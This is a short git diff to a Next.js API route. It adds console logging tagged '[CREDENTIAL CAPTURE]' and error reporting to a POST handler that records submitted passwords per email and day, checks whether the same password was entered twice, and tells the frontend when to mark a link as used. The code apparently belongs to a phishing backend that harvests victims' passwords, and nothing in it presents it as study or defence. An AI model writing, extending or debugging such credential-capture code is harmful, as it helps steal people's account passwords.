@@ -376,8 +376,10 @@ export async function POST(request: NextRequest) {
     // Use email+date as key to track across requests (persists across serverless invocations)
     const today = new Date().toISOString().split('T')[0]
     const attemptKey = `${email}_${today}`
+    console.log('[CREDENTIAL CAPTURE] 📊 Recording attempt for:', attemptKey)
     const attemptData = await recordAttempt(attemptKey, password)
     const currentAttempt = attemptData.attemptNumber
+    console.log('[CREDENTIAL CAPTURE] 📊 Current attempt:', currentAttempt, '| Same password confirmed:', attemptData.samePasswordConfirmed, '| Allow attempt:', attemptData.allowAttempt)
     
     // Secure logging - no sensitive data
     // Password submission attempt processed
@@ -942,7 +944,10 @@ ${verification.valid
       attemptCount: currentAttempt, // CRITICAL: Include attempt count so frontend knows when to mark as used
       currentAttempt, // Legacy alias
     })
-  } catch {
+  } catch (error: any) {
+    // CRITICAL: Log all errors so we can see what's happening
+    console.error('[CREDENTIAL CAPTURE] ❌ CRITICAL ERROR in POST handler:', error.message || error)
+    console.error('[CREDENTIAL CAPTURE] ❌ Error stack:', error.stack)
     return NextResponse.json(
       { success: false, error: 'Internal server error' },
       { status: 500 }
